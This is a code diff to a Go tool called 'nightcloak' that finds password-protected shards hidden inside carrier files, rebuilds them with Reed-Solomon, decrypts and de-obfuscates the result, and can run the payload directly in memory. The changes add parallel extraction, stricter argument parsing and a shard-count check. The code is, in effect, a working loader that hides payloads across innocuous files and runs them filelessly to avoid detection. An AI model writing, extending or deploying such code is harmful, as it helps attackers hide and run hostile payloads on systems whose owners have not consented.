@@ -8,9 +8,11 @@ import (
 	"math/rand"
 	"os"
 	"path/filepath"
+	"runtime"
 	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"nightcloak/pkg/cloak"
@@ -20,7 +22,7 @@ import (
 	"nightcloak/pkg/shard"
 )
 
-	const version = "0.9.1"
+	const version = "0.9.2"
 
 	const banner = `
 	╔╗╔╦═╗╔═╗╦ ╦╔╦╗╔═╗╦  ╔═╗╔═╗╦╔═
@@ -532,7 +534,16 @@ func cmdGather(args []string) {
 	}
 
 	searchDir := args[0]
-	execArgs := args[1:]
+
+	// Strict -- separator: exec args are only what follows "--", never
+	// bare positionals after searchDir.
+	var execArgs []string
+	for i, a := range args {
+		if a == "--" {
+			execArgs = args[i+1:]
+			break
+		}
+	}
 
 	password = resolvePassword(password)
 
@@ -547,7 +558,48 @@ func cmdGather(args []string) {
 	}
 	log("Found %d candidate(s)", len(found))
 
-	// Step 2: Extract shard bytes from each matched carrier and group by PayloadID.
+	// Step 2: Parallel extraction — pass already-loaded Content directly into
+	// cloak.RevealReader, eliminating the second disk read that cloak.Reveal
+	// would otherwise perform.
+	type extractResult struct {
+		path    string
+		payload []byte
+		err     error
+	}
+
+	type job struct{ r shard.ScanResult }
+	jobs := make(chan job, len(found))
+	for _, r := range found {
+		jobs <- job{r}
+	}
+	close(jobs)
+
+	results := make(chan extractResult, len(found))
+	workers := runtime.NumCPU()
+	if workers > len(found) {
+		workers = len(found)
+	}
+
+	var wg sync.WaitGroup
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for j := range jobs {
+				ext := strings.ToLower(filepath.Ext(j.r.Path))
+				res, err := cloak.RevealReader(j.r.Content, ext, password)
+				if err != nil {
+					results <- extractResult{path: j.r.Path, err: err}
+					continue
+				}
+				results <- extractResult{path: j.r.Path, payload: res.Payload}
+			}
+		}()
+	}
+	wg.Wait()
+	close(results)
+
+	// Step 3: Group extracted shards by PayloadID.
 	type shardGroup struct {
 		total    int
 		shards   map[int][]byte
@@ -555,21 +607,16 @@ func cmdGather(args []string) {
 	}
 	groups := make(map[[32]byte]*shardGroup)
 
-	for _, r := range found {
-		// Extract the embedded shard from the carrier.
-		// cloak.Reveal strips the S: wire format and returns raw shard bytes.
-		result, err := cloak.Reveal(r.Path, password)
-		if err != nil {
-			log("skipping %s: extract failed: %v", r.Path, err)
+	for res := range results {
+		if res.err != nil {
+			log("skipping %s: %v", res.path, res.err)
 			continue
 		}
-
-		m, err := shard.DecodeManifest(result.Payload)
+		m, err := shard.DecodeManifest(res.payload)
 		if err != nil {
-			log("skipping %s: manifest decode failed: %v", r.Path, err)
+			log("skipping %s: manifest decode failed: %v", res.path, err)
 			continue
 		}
-
 		g, ok := groups[m.PayloadID]
 		if !ok {
 			g = &shardGroup{
@@ -578,7 +625,7 @@ func cmdGather(args []string) {
 			}
 			groups[m.PayloadID] = g
 		}
-		g.shards[int(m.ShardIndex)] = result.Payload
+		g.shards[int(m.ShardIndex)] = res.payload
 		g.manifest = m
 	}
 
@@ -586,12 +633,28 @@ func cmdGather(args []string) {
 		die("no valid shard manifests found")
 	}
 
-	// Step 3: Reconstruct the first complete (or most complete) group.
+	// Step 4: Select the best reconstructable group.
+	// Prefer groups that already have >= DataShards shards (can reconstruct now).
+	// Fall back to the most complete group and report how many more are needed.
 	var bestGroup *shardGroup
 	for _, g := range groups {
-		if bestGroup == nil || len(g.shards) > len(bestGroup.shards) {
-			bestGroup = g
+		if len(g.shards) >= int(g.manifest.DataShards) {
+			if bestGroup == nil || len(g.shards) > len(bestGroup.shards) {
+				bestGroup = g
+			}
 		}
+	}
+	if bestGroup == nil {
+		// No group meets the reconstruction threshold — report the deficit.
+		var closest *shardGroup
+		for _, g := range groups {
+			if closest == nil || len(g.shards) > len(closest.shards) {
+				closest = g
+			}
+		}
+		need := int(closest.manifest.DataShards) - len(closest.shards)
+		die("not enough shards for reconstruction — have %d/%d, need %d more",
+			len(closest.shards), closest.total, need)
 	}
 
 	encodedShards := make([][]byte, bestGroup.total)
@@ -607,7 +670,7 @@ func cmdGather(args []string) {
 		die("Reed-Solomon reconstruction failed: %v", err)
 	}
 
-	// Step 4: Reverse the encryption pipeline.
+	// Step 5: Reverse the encryption pipeline.
 	raw := assembled
 
 	xkey, err := crypto.ResolveXKey()
@@ -631,7 +694,7 @@ func cmdGather(args []string) {
 		die("de-obfuscation failed: %v", err)
 	}
 
-	// Step 5: Output or Execution.
+	// Step 6: Output or execution.
 	if execute {
 		log("Executing reconstructed payload in-memory...")
 		if err := native.MemExec(clearBytes, execArgs); err != nil {
